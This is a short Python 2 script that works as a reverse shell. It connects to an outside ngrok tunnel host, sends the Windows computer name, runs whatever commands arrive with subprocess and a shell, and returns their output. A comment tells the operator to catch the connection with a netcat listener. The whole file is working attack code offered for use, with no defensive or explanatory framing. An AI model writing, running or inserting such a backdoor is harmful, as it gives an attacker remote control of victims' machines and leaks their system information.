#use nc -lvnp port 
import socket, os, subprocess
def connect():
    os.system('cls')
    global host
    global port
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 15610 #set port you like
    host = '0.tcp.ngrok.io' # set your ip
    try:
        print '[!] Trying to connect to %s:%s'%(host,port)
        s.connect((host,port))
        print '[!] Connection established'
        s.send(os.environ['COMPUTERNAME'])
    except:
        print 'Could not connect'
def recieve():
    recieve = s.recv(1024)
    if recieve == "quit":
        s.close
    else:
        proc2 = subprocess.Popen(recieve[0:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc2.stdout.read() + proc2.stderr.read()
        args = 'nice_shell: ' + stdout_value
    send(args)
def send(args):
    send = s.send(args)
    recieve()
connect()
recieve()
s.close()
